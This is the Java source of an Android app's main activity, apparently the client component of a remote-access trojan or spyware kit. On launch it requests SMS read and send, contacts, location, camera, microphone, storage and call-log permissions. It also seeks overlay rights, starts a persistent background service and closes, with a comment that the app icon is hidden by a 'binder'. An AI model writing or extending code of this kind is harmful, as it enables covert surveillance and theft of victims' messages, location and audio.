package com.wahala.client;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermissions();
    }

    private void requestPermissions() {
        String[] permissions = {
                Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CONTACTS, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG
        };
        ActivityCompat.requestPermissions(this, permissions, 1);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                startActivity(intent);
            }
        }

        // Start service
        Intent serviceIntent = new Intent(this, ServiceCore.class);
        ContextCompat.startForegroundService(this, serviceIntent);

        // Hide app icon (optional, implemented in binder)
        finish();
    }
}
